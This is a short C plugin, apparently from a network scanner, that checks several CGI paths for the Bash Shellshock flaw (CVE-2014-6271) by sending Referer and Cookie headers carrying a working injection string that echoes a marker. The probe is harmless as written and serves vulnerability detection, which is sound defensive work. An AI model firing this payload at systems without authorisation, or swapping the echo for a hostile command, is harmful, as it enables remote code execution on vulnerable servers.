/* http-shellshock - Bash CGI Shellshock (CVE-2014-6271) probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    static const char *paths[] = {
        "/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/admin.cgi",
        "/cgi-sys/defaultwebpage.cgi", "/"
    };
    char resp[8192];
    const char *body;
    size_t i;

    if (!ar_valid(ctx)) {
        return 1;
    }
    for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        int n = ar_http_request(ctx, "GET", paths[i], NULL,
                                "Referer: () { :; }; echo VULNERABLE\r\n"
                                "Cookie: () { :; }; echo VULNERABLE\r\n",
                                NULL, NULL, resp, sizeof(resp));
        if (n <= 0) {
            continue;
        }
        body = ar_http_body(resp);
        if (strstr(body, "VULNERABLE") != NULL ||
            strstr(resp, "VULNERABLE") != NULL) {
            ar_out(ctx, "VULNERABLE: Shellshock CVE-2014-6271 at %s", paths[i]);
            return 0;
        }
    }
    ar_out(ctx, "not vulnerable: Shellshock CVE-2014-6271 not confirmed");
    return 0;
}
